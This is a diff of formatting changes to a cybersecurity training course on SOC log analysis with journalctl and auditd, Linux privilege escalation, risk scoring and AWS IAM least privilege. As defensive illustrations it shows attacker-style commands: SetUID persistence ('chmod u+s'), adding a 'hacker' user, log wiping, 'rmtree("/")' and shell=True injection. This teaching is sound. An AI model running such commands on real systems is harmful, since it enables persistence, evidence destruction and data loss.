-- ↓
-- Database
+```text
+App Servers
+↓
+Database
+```
 
 Only application servers gain access.
 
@@ -8732,13 +8885,17 @@ AI immediately flags:
 If using AWS CLI:
 
 **List Security Groups**
+
 ```bash
 aws ec2 describe-security-groups
+
 ```
 **View Rules**
+
 ```bash
 aws ec2 describe-security-groups \
 --group-ids sg-123456
+
 ```
 
 → [Whiteboard Diagram](diagrams/security-groups-as-firewalls-043.svg)
@@ -8886,6 +9043,7 @@ Browser sends:
 
 ```http
 GET /
+
 ```
 
 Nginx replies:
@@ -8894,6 +9052,7 @@ Nginx replies:
 <html>
 Welcome
 </html>
+
 ```
 
 ## Why Web Servers Matter in Cybersecurity
@@ -8953,8 +9112,10 @@ Good:
 
 Good configuration:
 
-- SSH 22 → Admin IP
-- HTTPS 443 → Internet
+```text
+SSH 22 → Admin IP
+HTTPS 443 → Internet
+```
 
 Bad configuration:
 
@@ -9037,6 +9198,7 @@ The slide references:
 
 ```bash
 /var/log/nginx/access.log
+
 ```
 
 This is extremely important.
@@ -9122,12 +9284,14 @@ Security analysts regularly review:
 
 ```bash
 cat /var/log/nginx/access.log
+
 ```
 
 or
 
 ```bash
 tail -f /var/log/nginx/access.log
+
 ```
 
 ## Real SOC Workflow
@@ -9299,6 +9463,7 @@ Answer:
 **Q: Why should web services avoid running as root?:** To reduce damage if compromised.
 **Q: Where are Nginx access logs typically stored?** ```bash
 /var/log/nginx/access.log
+
 ```
 **Q: What does SELinux do?:** Provides additional access controls that restrict what processes can access.
 
@@ -9578,15 +9743,19 @@ Tier 3 actively searches for threats.
 
 Traditional Approach
 
-- Alert
-- ↓
-- Investigate
+```text
+Alert
+↓
+Investigate
+```
 
 Threat Hunting
 
-- Search
-- ↓
-- Find Hidden Threats
+```text
+Search
+↓
+Find Hidden Threats
+```
 
 ## Example
 
@@ -9700,9 +9869,11 @@ Network logs record:
 
 Example:
 
-- Laptop A
-- ↓
-- Unknown Russian Server
+```text
+Laptop A
+↓
+Unknown Russian Server
+```
 
 Suspicious.
 
@@ -11128,15 +11299,10 @@ Students often confuse them.
 Use this comparison:
 
 | Cyber Kill Chain          | MITRE ATT&CK               |
-
 | ------------------------- | -------------------------- |
-
 | High-level attack stages  | Detailed attacker behavior |
-
 | 7 stages                  | Hundreds of techniques     |
-
 | Focus on attack lifecycle | Focus on attacker actions  |
-
 | Easier for beginners      | Used heavily by SOC teams  |
 
 Example:
@@ -11528,14 +11694,17 @@ and
 Explain these simply.
 
 **SSH Logs:** View with:
+
 ```bash
 sudo journalctl -u sshd
+
 ```
 
 or
 
 ```bash
 sudo cat /var/log/secure
+
 ```
 
 (RHEL/Amazon Linux)
@@ -11547,8 +11716,10 @@ These logs show:
 - Connection attempts
 
 **Audit Logs:** Location:
+
 ```bash
 /var/log/audit/audit.log
+
 ```
 
 Records:
@@ -11749,6 +11920,7 @@ You log into a Linux server as:
 
 ```bash
 ec2-user
+
 ```
 
 Normally you can:
@@ -11768,6 +11940,7 @@ If you somehow become root:
 
 ```bash
 sudo su -
+
 ```
 
 You now control everything.
@@ -11831,6 +12004,7 @@ Example:
 ec2-user
 ubuntu
 john
+
 ```
 
 Can perform everyday tasks.
@@ -11839,6 +12013,7 @@ Can perform everyday tasks.
 
 ```bash
 root
+
 ```
 
 Has unrestricted access.
@@ -11882,12 +12057,14 @@ Example:
 
 ```bash
 sudo yum update
+
 ```
 
 or
 
 ```bash
 sudo apt update
+
 ```
 
 ## How Misconfiguration Happens
@@ -11909,18 +12086,21 @@ Normal user:
 
 ```bash
 john
+
 ```
 
 Runs:
 
 ```bash
 sudo su -
+
 ```
 
 Now becomes:
 
 ```bash
 root
+
 ```
 
 Game over.
@@ -11938,12 +12118,14 @@ Example:
 
 ```bash
 john runs program
+
 ```
 
 Program executes as:
 
 ```bash
 john
+
 ```
 
 With SetUID:
@@ -11963,10 +12145,12 @@ When John executes it:
 Linux uses SetUID intentionally.
 
 Examples:
+
 ```bash
 passwd
 ping
 sudo
+
 ```
 
 These require elevated permissions.
@@ -11977,12 +12161,14 @@ Suppose attacker creates:
 
 ```bash
 evil_script
+
 ```
 
 and marks it:
 
 ```bash
 chmod u+s evil_script
+
 ```
 
 Now it runs as root.
@@ -11993,6 +12179,7 @@ This can provide persistent root access.
 
 ```bash
 -rwsr-xr-x
+
 ```
 
 Notice:
@@ -12011,6 +12198,7 @@ Imagine:
 
 ```bash
 find / -perm -4000
+
 ```
 
 returns:
@@ -12050,6 +12238,7 @@ Example:
 
 ```bash
 chmod 777 important_script.sh
+
 ```
 
 Attacker modifies script.
@@ -12066,6 +12255,7 @@ Example:
 
 ```bash
 /backup/backup.sh
+
 ```
 
 Writable by normal users.
@@ -12107,6 +12297,7 @@ Example:
 
 ```bash
 sudo su -
+
 ```
 
 at 3 AM.
@@ -12119,6 +12310,7 @@ Example:
 
 ```bash
 find / -perm -4000
+
 ```
 
 Suddenly shows:
@@ -12133,12 +12325,14 @@ Monitor:
 
 ```bash
 /etc/sudoers
+
 ```
 
 and
 
 ```bash
 /etc/sudoers.d/
+
 ```
 
 Any modification should trigger an alert.
@@ -12158,22 +12352,26 @@ Important files:
 
 ```bash
 /var/log/audit/audit.log
+
 ```
 
 and
 
 ```bash
 journalctl
+
 ```
 
 Useful commands:
 
 ```bash
 sudo ausearch -m USER_CMD
+
 ```
 
 ```bash
 sudo ausearch -m USER_LOGIN
+
 ```
 
 ## Prevention
@@ -12212,6 +12410,7 @@ Regularly check:
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 Unexpected entries:
@@ -12243,12 +12442,14 @@ If user normally runs:
 cat
 ls
 grep
+
 ```
 
 but suddenly runs:
 
 ```bash
 sudo useradd hacker
+
 ```
 
 AI flags the behavior.
@@ -12434,8 +12635,10 @@ Useful for detecting:
 - Account compromise
 
 **Linux Example**
+
 ```bash
 sudo journalctl -u sshd
+
 ```
 Shows:
 
@@ -12460,6 +12663,7 @@ Example:
 
 ```bash
 wget malware.exe
+
 ```
 
 Appears in logs.
@@ -12653,12 +12857,14 @@ Advanced attackers often run:
 
 ```bash
 rm logfile
+
 ```
 
 or
 
 ```bash
 history -c
+
 ```
 
 because they know:
@@ -12910,12 +13116,14 @@ The primary tool is:
 
 ```bash
 journalctl
+
 ```
 
 ### View Everything
 
 ```bash
 journalctl
+
 ```
 
 Displays all available journal entries.
@@ -12924,6 +13132,7 @@ Displays all available journal entries.
 
 ```bash
 journalctl -n 50
+
 ```
 
 Shows the last 50 entries.
@@ -12934,12 +13143,14 @@ Equivalent to Linux:
 
 ```bash
 tail -f
+
 ```
 
 Command:
 
 ```bash
 journalctl -f
+
 ```
 
 ## Investigating SSH Activity
@@ -12950,12 +13161,14 @@ Command:
 
 ```bash
 journalctl -u ssh
+
 ```
 
 or
 
 ```bash
 journalctl -u sshd
+
 ```
 
 Shows:
@@ -12978,12 +13191,14 @@ Command:
 
 ```bash
 journalctl -u sudo
+
 ```
 
 or
 
 ```bash
 journalctl _COMM=sudo
+
 ```
 
 Example:
@@ -13001,18 +13216,21 @@ One of journalctl's most powerful features.
 
 ```bash
 journalctl --since "10 minutes ago"
+
 ```
 
 ### Last Hour
 
 ```bash
 journalctl --since "1 hour ago"
+
 ```
 
 ### Specific Date
 
 ```bash
 journalctl --since "2026-06-18 10:00:00"
+
 ```
 
 Useful during investigations.
@@ -13023,6 +13241,7 @@ Command:
 
 ```bash
 journalctl -u ssh -u sudo --since "10 minutes ago"
+
 ```
 
 Meaning:
@@ -13039,6 +13258,7 @@ Command:
 
 ```bash
 journalctl _COMM=sudo | grep -i fail
+
 ```
 
 Purpose:
@@ -13127,6 +13347,7 @@ auditd rules are managed using:
 
 ```bash
 auditctl
+
 ```
 
 This tells Linux what should be monitored.
@@ -13137,6 +13358,7 @@ Command:
 
 ```bash
 sudo auditctl -w /etc/passwd -p rwa -k passwd_watch
+
 ```
 
 Let's break it down.
@@ -13171,6 +13393,7 @@ Suppose an attacker modifies:
 
 ```bash
 sudo vi /etc/passwd
+
 ```
 
 auditd records:
@@ -13190,6 +13413,7 @@ Runs:
 
 ```bash
 sudo useradd hacker
+
 ```
 
 auditd records:
@@ -13204,21 +13428,13 @@ Analyst can reconstruct the activity.
 ## journald vs auditd
 
 | Feature                 | journald | auditd    |
-
 | ----------------------- | -------- | --------- |
-
 | Service Logs            | Yes      | Limited   |
-
 | SSH Events              | Yes      | Yes       |
-
 | sudo Activity           | Yes      | Yes       |
-
 | File Access Monitoring  | Limited  | Excellent |
-
 | System Call Monitoring  | No       | Yes       |
-
 | Compliance Auditing     | Limited  | Excellent |
-
 | Forensic Investigations | Good     | Excellent |
 
 ## Real SOC Workflow
@@ -13233,6 +13449,7 @@ Check journald
 
 ```bash
 journalctl -u ssh
+
 ```
 
 Questions:
@@ -13247,6 +13464,7 @@ Check auditd
 
 ```bash
 ausearch
+
 ```
 
 Questions:
@@ -13344,14 +13562,17 @@ Every stage creates evidence that can be searched later.
 ## Primary SSH Log Sources
 
 **systemd-journald:** Modern Linux:
+
 ```bash
 journalctl -u sshd
+
 ```
 
 or
 
 ```bash
 journalctl -u ssh
+
 ```
 
 **Traditional Log Files:** Depending on distribution:
@@ -13522,6 +13743,7 @@ Analysts build timelines from events like these.
 
 ```bash
 sudo journalctl -u sshd --since "30 min ago" -o json > sshd.jsonl
+
 ```
 
 ## Breaking Down the Command
@@ -13572,6 +13794,7 @@ Allows:
   "MESSAGE": "Failed password for ec2-user",
   "_SOURCE_REALTIME_TIMESTAMP": "1718737000"
 }
+
 ```
 
 SOC tools can process this automatically.
@@ -13579,8 +13802,10 @@ SOC tools can process this automatically.
 ## SSH Evidence Collection Workflow
 
 **Step 1:** Collect logs
+
 ```bash
 journalctl -u sshd
+
 ```
 
 **Step 2:** Identify:
@@ -13724,16 +13949,20 @@ Goal:
 `Collect original data before it changes`
 
 Examples:
+
 ```bash
 journalctl -u sshd --since "1 hour ago"
+
 ```
 
 ```bash
 cp /var/log/audit/audit.log evidence/
+
 ```
 
 ```bash
 aws logs get-log-events
+
 ```
 
 ## Why Capture Comes First
@@ -13783,15 +14012,10 @@ Analyst extracts:
 Result:
 
 | Field | Value           |
-
 | ----- | --------------- |
-
 | Time  | 10:22:01        |
-
 | User  | admin           |
-
 | IP    | 203.0.113.5     |
-
 | Event | Failed Password |
 
 ## Why Parsing Matters
@@ -13852,6 +14076,7 @@ Search for SSH failures:
 
 ```bash
 journalctl -u sshd | grep "Failed password"
+
 ```
 
 Result:
@@ -13884,9 +14109,11 @@ Source 3:
 
 Combined:
 
-- User logged in
-- → Became root
-- → Accessed sensitive files
+```text
+User logged in
+→ Became root
+→ Accessed sensitive files
+```
 
 Now a meaningful story emerges.
 
@@ -13996,6 +14223,7 @@ Capture:
 
 ```bash
 journalctl -u sshd
+
 ```
 
 Parse:
@@ -14085,17 +14313,11 @@ Higher scores indicate higher investigation priority.
 Many organizations use a simple scale:
 
 | Score  | Risk Level |
-
 | ------ | ---------- |
-
 | 0–20   | Low        |
-
 | 21–40  | Medium     |
-
 | 41–60  | High       |
-
 | 61–80  | Very High  |
-
 | 81–100 | Critical   |
 
 Example:
@@ -14234,15 +14456,10 @@ These systems continuously adjust scores as new events occur.
 ## Example Investigation Queue
 
 | Entity            | Score | Priority |
-
 | ----------------- | ----- | -------- |
-
 | Domain Controller | 95    | Critical |
-
 | Finance Server    | 82    | Critical |
-
 | Employee Laptop   | 45    | High     |
-
 | Test VM           | 20    | Low      |
 
 Analysts start from the top.
@@ -14254,15 +14471,10 @@ Different ATT&CK techniques can contribute different scores.
 Example:
 
 | Technique            | ID    | Risk      |
-
 | -------------------- | ----- | --------- |
-
 | Brute Force          | T1110 | Medium    |
-
 | Privilege Escalation | T1548 | High      |
-
 | Credential Dumping   | T1003 | Very High |
-
 | Data Exfiltration    | T1041 | Critical  |
 
 The more dangerous the behavior, the higher the score.
@@ -14316,17 +14528,11 @@ Outcome:
 Examples:
 
 | Event Type           | Score |
-
 | -------------------- | ----- |
-
 | ssh_ident_probe      | 2     |
-
 | ssh_failed_login     | 4     |
-
 | ssh_burst_scan       | 8     |
-
 | Privilege Escalation | 25    |
-
 | Malware Execution    | 40    |
 
 Higher-confidence indicators contribute more points than low-confidence indicators.
@@ -14356,15 +14562,10 @@ The score is attached to the IP address, not each individual event.
 Example:
 
 | Score Range | Severity |
-
 | ----------- | -------- |
-
 | 0–19        | Low      |
-
 | 20–39       | Medium   |
-
 | 40–69       | High     |
-
 | 70+         | Critical |
 
 As additional suspicious activity occurs, an entity can move from Low to Critical.
@@ -14482,6 +14683,7 @@ with open("events.json") as f:
     data = json.load(f)
 
 print(data["event_type"])
+
 ```
 
 ##### `re` Module (Regular Expressions)
@@ -14498,6 +14700,7 @@ log = "Failed password for root from 192.168.1.10"
 ip = re.search(r"\d+\.\d+\.\d+\.\d+", log)
 
 print(ip.group())
+
 ```
 
 Output:
@@ -14526,6 +14729,7 @@ counts["192.168.1.10"] += 1
 counts["192.168.1.10"] += 1
 
 print(counts)
+
 ```
 
 Output:
@@ -14545,6 +14749,7 @@ Example:
 with open("findings.csv", "w") as f:
     f.write("ip,score\n")
     f.write("192.168.1.10,45\n")
+
 ```
 
 Common outputs:
@@ -14559,6 +14764,7 @@ Common outputs:
 → [Example Security Automation Workflow](diagrams/risk-scoring-fundamentals-067.svg)
 
 **Example: Counting Failed SSH Logins**
+
 ```python
 from collections import defaultdict
 failed_logins = defaultdict(int)
@@ -14569,6 +14775,7 @@ with open("auth.log") as f:
             failed_logins["SSH"] += 1
 
 print(failed_logins)
+
 ```
 
 Output:
@@ -14578,23 +14785,19 @@ Output:
 **Security Automation Benefits**
 
 | Manual Process       | Python Automation      |
-
 | -------------------- | ---------------------- |
-
 | Slow and repetitive  | Fast and repeatable    |
-
 | Prone to human error | Consistent results     |
-
 | Difficult to scale   | Handles large datasets |
-
 | Hard to audit        | Fully documented code  |
-
 | One-time analysis    | Reusable workflows     |
 **SOC Analyst Example:** Instead of manually searching:
+
 ```bash
 grep "Failed password" auth.log
 grep "Invalid user" auth.log
 grep "Accepted publickey" auth.log
+
 ```
 
 A Python script can:
@@ -14639,15 +14842,10 @@ Risk level assigned based on available evidence.
 Common classifications:
 
 | Severity | Meaning                              |
-
 | -------- | ------------------------------------ |
-
 | Low      | Suspicious but limited impact        |
-
 | Medium   | Requires investigation               |
-
 | High     | Strong indicators of compromise      |
-
 | Critical | Active compromise or business impact |
 
 Example:
@@ -14888,19 +15086,12 @@ Example:
 **Benefits of AI**
 
 | Benefit        | Description                          |
-
 | -------------- | ------------------------------------ |
-
 | Speed          | Faster analysis of large datasets    |
-
 | Scale          | Handles millions of events           |
-
 | Consistency    | Applies rules uniformly              |
-
 | Automation     | Reduces repetitive tasks             |
-
 | Prioritization | Focuses analysts on important alerts |
-
 | Productivity   | Accelerates investigations           |
 **Limitations of AI:** AI is powerful but imperfect.
 Common challenges:
@@ -14940,21 +15131,13 @@ Humans remain accountable for security decisions.
 **AI Use Cases Across Security Domains**
 
 | Domain               | AI Application                          |
-
 | -------------------- | --------------------------------------- |
-
 | SOC Operations       | Alert triage and investigation          |
-
 | Endpoint Security    | Malware detection                       |
-
 | Network Security     | Traffic anomaly detection               |
-
 | Threat Intelligence  | IOC extraction and correlation          |
-
 | Cloud Security       | Misconfiguration detection              |
-
 | Identity Security    | User behavior analytics                 |
-
 | Application Security | Code review and vulnerability detection |
 **Key Takeaway**
 **AI is becoming a core component of modern cybersecurity operations. It excels at analyzing large volumes of data, identifying patterns, prioritizing alerts, and automating repetitive tasks. However, AI is most effective when paired with human expertise, creating a human-in-the-loop model where AI accelerates analysis while security professionals remain responsible for investigation, validation, and response decisions.**
@@ -15024,6 +15207,7 @@ Example:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 AI might flag:
@@ -15078,19 +15262,12 @@ Example:
 **AI-Assisted Cloud Security:** Cloud security teams increasingly use AI for:
 
 | Security Area     | AI Capability              |
-
 | ----------------- | -------------------------- |
-
 | AWS IAM           | Permission review          |
-
 | CloudTrail        | Activity analysis          |
-
 | Security Groups   | Misconfiguration detection |
-
 | GuardDuty         | Threat investigation       |
-
 | CloudWatch Logs   | Pattern recognition        |
-
 | Incident Response | Investigation assistance   |
 
 **AI Workflow in a SOC:**
@@ -15188,6 +15365,7 @@ AI can generate:
 import re
 
 pattern = r'(\w+\s+\d+\s+\d+:\d+:\d+).*from\s+(\d+\.\d+\.\d+\.\d+)'
+
 ```
 
 ##### 2. Regular Expression Generation
@@ -15202,6 +15380,7 @@ Generated Regex:
 
 ```regex
 \b(?:\d{1,3}\.){3}\d{1,3}\b
+
 ```
 
 Useful for:
@@ -15265,6 +15444,7 @@ logsource:
 detection:
   selection:
     EventID: failed_login
+
 ```
 
 This accelerates detection rule development.
@@ -15272,19 +15452,12 @@ This accelerates detection rule development.
 **Security Automation Opportunities:** AI assistants help create:
 
 | Task                    | Example                    |
-
 | ----------------------- | -------------------------- |
-
 | Log Parsers             | SSH, Web, Firewall Logs    |
-
 | Threat Hunting Scripts  | IOC Matching               |
-
 | Alert Enrichment        | IP Reputation Checks       |
-
 | Cloud Security Audits   | IAM Reviews                |
-
 | Incident Response Tools | Evidence Collection        |
-
 | Compliance Scripts      | Security Validation Checks |
 
 **Example SOC Workflow:**
@@ -15625,6 +15798,7 @@ Check for:
 API_KEY = "abc123"
 PASSWORD = "admin123"
 AWS_SECRET_KEY = "xxxx"
+
 ```
 
 Risks:
@@ -15639,6 +15813,7 @@ Best Practice:
 import os
 
 api_key = os.getenv("API_KEY")
+
 ```
 
 ##### 3. Review File Operations
@@ -15654,6 +15829,7 @@ Potentially dangerous:
 ```python
 import shutil
 shutil.rmtree("/")
+
 ```
 
 Ensure file operations are limited and justified.
@@ -15666,12 +15842,14 @@ Carefully review:
 os.system()
 subprocess.run()
 subprocess.Popen()
+
 ```
 
 Especially dangerous:
 
 ```python
 subprocess.run(user_input, shell=True)
+
 ```
 
 Risks:
@@ -15686,6 +15864,7 @@ subprocess.run(
     ["ls", "-l"],
     shell=False
 )
+
 ```
 
 ##### 5. Check for Unsafe Functions
@@ -15697,6 +15876,7 @@ eval()
 exec()
 pickle.loads()
 yaml.load()
+
 ```
 
 These functions can introduce:
@@ -15708,9 +15888,11 @@ These functions can introduce:
 Safer alternatives should be considered whenever possible.
 
 **Error Handling Review:** Poor example:
+
 ```python
 data = json.load(file)
 print(data["ip"])
+
 ```
 
 Potential problem:
@@ -15726,6 +15908,7 @@ try:
     data = json.load(file)
 except Exception as e:
     print(f"Error: {e}")
+
 ```
 
 Reviewers should ensure failures are handled gracefully.
@@ -15749,6 +15932,7 @@ Look for:
 ```json
 "Action": "*"
 "Resource": "*"
+
 ```
 
 Risk:
@@ -15761,15 +15945,18 @@ Prefer:
 "Action": [
     "s3:GetObject"
 ]
+
 ```
 
 with resource restrictions.
 
 **Review AI-Generated Queries:** Example CloudWatch Query:
+
 ```sql
 fields @timestamp,@message
 
 | filter @message like /sudo/
+
 ```
 
 Validate:
@@ -15790,21 +15977,13 @@ Never deploy directly from generated output.
 **Common AI Mistakes Found During Review**
 
 | Issue                 | Example                       |
-
 | --------------------- | ----------------------------- |
-
 | Hallucinated Function | Nonexistent library call      |
-
 | Insecure Code         | shell=True                    |
-
 | Hardcoded Secret      | Embedded API key              |
-
 | Poor Error Handling   | No exception handling         |
-
 | Excessive Permissions | IAM wildcards                 |
-
 | Logic Error           | Incorrect detection threshold |
-
 | Missing Validation    | Unsanitized user input        |
 **Questions Every Analyst Should Ask:** Before using AI-generated output:
 1. Is it technically correct?
@@ -15861,18 +16040,22 @@ Users typically have:
 
 Example:
 
-- Developer User
-- ├── Console Login
-- ├── Access Key ID
-- └── Secret Access Key
+```text
+Developer User
+├── Console Login
+├── Access Key ID
+└── Secret Access Key
+```
 
 **Group:** A Group is a collection of IAM Users.
 Instead of assigning permissions individually:
 
-- Developers Group
-- ├── Alice
-- ├── Bob
-- └── Charlie
+```text
+Developers Group
+├── Alice
+├── Bob
+└── Charlie
+```
 
 Attach policies once to the group and all members inherit permissions.
 
@@ -15895,6 +16078,7 @@ Example:
     "arn:aws:s3:::security-logs/*"
   ]
 }
+
 ```
 
 A policy answers:
@@ -15958,6 +16142,7 @@ Bad Example:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Good Example:
@@ -15971,6 +16156,7 @@ Good Example:
     "arn:aws:s3:::security-logs/*"
   ]
 }
+
 ```
 
 ### IAM Policy Structure
@@ -15978,27 +16164,34 @@ Good Example:
 Every policy contains:
 
 **Effect**
+
 ```json
 "Effect": "Allow"
+
 ```
 or
 
 ```json
 "Effect": "Deny"
+
 ```
 
 **Action:** Specifies allowed operations.
 Examples:
+
 ```json
 "s3:GetObject"
+
 ```
 
 ```json
 "ec2:DescribeInstances"
+
 ```
 
 ```json
 "iam:CreateUser"
+
 ```
 
 **Resource:** Specifies affected resources.
@@ -16006,6 +16199,7 @@ Example:
 
 ```json
 "arn:aws:s3:::my-bucket/*"
+
 ```
 
 **Condition (Optional):** Adds restrictions.
@@ -16017,6 +16211,7 @@ Example:
     "aws:SourceIp": "203.0.113.0/24"
   }
 }
+
 ```
 
 ### Common IAM Misconfigurations
@@ -16029,13 +16224,16 @@ Risk:
 * Infrastructure destruction
 
 **Wildcard Permissions**
+
 ```json
 "Action": "*"
+
 ```
 or
 
 ```json
 "Resource": "*"
+
 ```
 
 Risk:
@@ -16118,6 +16316,7 @@ Misconfigured Policy:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Attacker compromises a developer account.
@@ -16180,6 +16379,7 @@ A typical IAM policy looks like:
     }
   ]
 }
+
 ```
 
 ### Major Policy Elements
@@ -16189,6 +16389,7 @@ Example:
 
 ```json
 "Version": "2012-10-17"
+
 ```
 
 This is currently the standard version used in AWS policies.
@@ -16202,18 +16403,22 @@ Example:
       ...
    }
 ]
+
 ```
 
 A policy may contain multiple statements.
 
 **Effect:** Defines whether access is allowed or denied.
 Examples:
+
 ```json
 "Effect": "Allow"
+
 ```
 
 ```json
 "Effect": "Deny"
+
 ```
 
 **Important Rule:**
@@ -16224,16 +16429,20 @@ This is one of the most important IAM concepts.
 
 **Action:** Specifies the AWS API operations being controlled.
 Examples:
+
 ```json
 "Action": "s3:GetObject"
+
 ```
 
 ```json
 "Action": "ec2:DescribeInstances"
+
 ```
 
 ```json
 "Action": "iam:CreateUser"
+
 ```
 
 Multiple actions:
@@ -16243,18 +16452,22 @@ Multiple actions:
     "s3:GetObject",
     "s3:PutObject"
 ]
+
 ```
 
 **Resource:** Specifies the AWS resources affected.
 Examples:
+
 ```json
 "Resource":
 "arn:aws:s3:::security-logs/*"
+
 ```
 
 ```json
 "Resource":
 "arn:aws:ec2:*:*:instance/*"
+
 ```
 
 AWS uses Amazon Resource Names (ARNs) to uniquely identify resources.
@@ -16288,31 +16501,37 @@ Example:
     }
   }
 }
+
 ```
 
 This allows access only from approved IP addresses.
 
 **Common Condition Examples:** ##### Restrict by IP
+
 ```json
 "aws:SourceIp"
+
 ```
 
 ##### Restrict by MFA
 
 ```json
 "aws:MultiFactorAuthPresent"
+
 ```
 
 ##### Restrict by Time
 
 ```json
 "aws:CurrentTime"
+
 ```
 
 ##### Restrict by Region
 
 ```json
 "aws:RequestedRegion"
+
 ```
 
 ### Allow Policy Example
@@ -16329,6 +16548,7 @@ Read-only access to an S3 bucket:
     "arn:aws:s3:::security-logs/*"
   ]
 }
+
 ```
 
 Permission granted:
@@ -16353,6 +16573,7 @@ Block bucket deletion:
   ],
   "Resource": "*"
 }
+
 ```
 
 Even administrators can be blocked by an explicit deny.
@@ -16363,6 +16584,7 @@ Wildcard:
 
 ```json
 "Action": "*"
+
 ```
 
 Means:
@@ -16373,6 +16595,7 @@ Wildcard:
 
 ```json
 "Resource": "*"
+
 ```
 
 Means:
@@ -16387,6 +16610,7 @@ Means:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 This effectively grants administrator-level permissions.
@@ -16406,6 +16630,7 @@ Bad:
   "Action": "*",
   "Resource": "*"
 }
+
 ```
 
 Good:
@@ -16419,6 +16644,7 @@ Good:
     "arn:aws:s3:::security-logs/*"
   ]
 }
+
 ```
 
 Only the required permission is granted.
@@ -16441,6 +16667,7 @@ Policy:
   "Action":"s3:GetObject",
   "Resource":"*"
 }
+
 ```
 
 Result:
@@ -16459,6 +16686,7 @@ Policy:
   "Action":"s3:DeleteBucket",
   "Resource":"*"
 }
+
 ```
 
 Result:
@@ -16468,8 +16696,10 @@ Result:
 ### Common IAM Policy Review Findings
 
 **Excessive Permissions**
+
 ```json
 "Action":"*"
+
 ```
 Risk:
 
@@ -16478,8 +16708,10 @@ Risk:
 * Resource destruction
 
 **Resource Wildcards**
+
 ```json
 "Resource":"*"
+
 ```
 Risk:
 
@@ -16503,8 +16735,10 @@ Review whether they are truly required.
 **Apply Least Privilege:** Grant only necessary permissions.
 **Use Explicit Deny When Needed:** Protect critical resources.
 **Limit Resource Scope:** Avoid:
+
 ```json
 "Resource":"*"
+
 ```
 
 Use specific ARNs.
@@ -16587,21 +16821,25 @@ These permissions are frequently abused during cloud attacks.
 ### Common Least Privilege Violations
 
 **AdministratorAccess Everywhere**
+
 ```json
 {
 "Action": "*",
 "Resource": "*"
 }
+
 ```
 Problem:
 `Unlimited Access`
 
 **Excessive Service Permissions:** Bad:
+
 ```json
 {
   "Action": "s3:*",
   "Resource": "*"
 }
+
 ```
 
 Better:
@@ -16615,6 +16853,7 @@ Better:
     "arn:aws:s3:::reports/*"
   ]
 }
+
 ```
 
 **Unused Permissions:** Many users and roles accumulate permissions that are never used.
@@ -16635,8 +16874,10 @@ while only needing:
 ### Least Privilege in AWS IAM
 
 **Scope Actions:** Instead of:
+
 ```json
 "Action": "*"
+
 ```
 
 Use:
@@ -16645,11 +16886,14 @@ Use:
 "Action": [
   "s3:GetObject"
 ]
+
 ```
 
 **Scope Resources:** Instead of:
+
 ```json
 "Resource": "*"
+
 ```
 
 Use:
@@ -16657,6 +16901,7 @@ Use:
 ```json
 "Resource":
 "arn:aws:s3:::security-logs/*"
+
 ```
 
 **Use Conditions:** Restrict access by:
@@ -16676,6 +16921,7 @@ Example:
     }
   }
 }
+
 ```
 
 ### Practical Least Privilege Approach
@@ -16708,6 +16954,7 @@ Bad:
   "Action": "s3:*",
   "Resource": "*"
 }
+
 ```
 
 Good:
@@ -16722,6 +16969,7 @@ Good:
     "arn:aws:s3:::training-data/*"
   ]
 }
+
 ```
 
 The second policy provides only the capability required.
@@ -16828,6 +17076,7 @@ and add additional permissions only if the application fails due to missing acce
 * Roles with excessive access
 
 **Example Finding:** A role contains:
+
 ```json
 {
   "Action": [
@@ -16836,6 +17085,7 @@ and add additional permissions only if the application fails due to missing acce
     "rds:*"
   ]
 }
+
 ```
 
 Access Analyzer may reveal:
@@ -16865,17 +17115,11 @@ This gradual accumulation creates unnecessary risk.
 **Recommended Review Schedule**
 
 | Environment           | Review Frequency |
-
 | --------------------- | ---------------- |
-
 | Production            | Monthly          |
-
 | High Security Systems | Monthly          |
-
 | Standard Enterprise   | Quarterly        |
-
 | Development           | Quarterly        |
-
 | Low-Risk Environments | Semi-Annual      |
 
 ### Why Quarterly Reviews Matter
@@ -16896,13 +17140,16 @@ Regular reviews reduce attack surface and improve compliance.
 ### Example: S3 Data Analyst Role
 
 **Bad Approach**
+
 ```json
 {
 "Action": "s3:*",
 "Resource": "*"
 }
+
 ```
 **Better Approach**
+
 ```json
 {
 "Action": [
@@ -16914,6 +17161,7 @@ Regular reviews reduce attack surface and improve compliance.
 "arn:aws:s3:::analytics-data/*"
 ]
 }
+
 ```
 The analyst can read data but cannot:
 
@@ -16944,27 +17192,31 @@ Because the execution role defines everything the function can access, it is one
 
 ### How Lambda Execution Roles Work
 
-- Lambda Function
-- │
-- ▼
-- Assume Execution Role
-- │
-- ▼
-- IAM Policy Evaluation
-- │
-- ▼
-- Allow or Deny AWS API Calls
+```text
+Lambda Function
+│
+▼
+Assume Execution Role
+│
+▼
+IAM Policy Evaluation
+│
+▼
+Allow or Deny AWS API Calls
+```
 
 Example:
 
-- Lambda Function
-- │
-- ▼
-- Role: OrderProcessorRole
-- │
-- ├── s3:GetObject
-- ├── dynamodb:PutItem
-- └── logs:PutLogEvents
+```text
+Lambda Function
+│
+▼
+Role: OrderProcessorRole
+│
+├── s3:GetObject
+├── dynamodb:PutItem
+└── logs:PutLogEvents
+```
 
 The function can only perform these approved actions.
 
@@ -16984,6 +17236,7 @@ Recommended permissions:
   ],
   "Resource": "*"
 }
+
 ```
 
 These permissions allow Lambda to:
@@ -16997,22 +17250,26 @@ Without them, debugging becomes difficult because function output will not appea
 ### Resource-Level Permissions
 
 **Bad Practice**
+
 ```json
 {
 "Effect": "Allow",
 "Action": "s3:GetObject",
 "Resource": "*"
 }
+
 ```
 This grants access to every S3 bucket in the account.
 
 **Good Practice**
+
 ```json
 {
 "Effect": "Allow",
 "Action": "s3:GetObject",
 "Resource": "arn:aws:s3:::customer-data/*"
 }
+
 ```
 This limits access to a specific bucket.
 
@@ -17040,24 +17297,32 @@ Example attack path:
 ### One Role Per Function
 
 **Bad Design**
-- SharedRole
-- ├── Lambda A
-- ├── Lambda B
-- ├── Lambda C
-- └── Lambda D
+
+```text
+SharedRole
+├── Lambda A
+├── Lambda B
+├── Lambda C
+└── Lambda D
+```
+
 Problem:
 `All functions inherit every permission.`
 
 **Better Design**
-- OrderProcessorRole
-- │
-- OrderProcessor Lambda
-- PaymentRole
-- │
-- Payment Lambda
-- ReportingRole
-- │
-- Reporting Lambda
+
+```text
+OrderProcessorRole
+│
+OrderProcessor Lambda
+PaymentRole
+│
+Payment Lambda
+ReportingRole
+│
+Reporting Lambda
+```
+
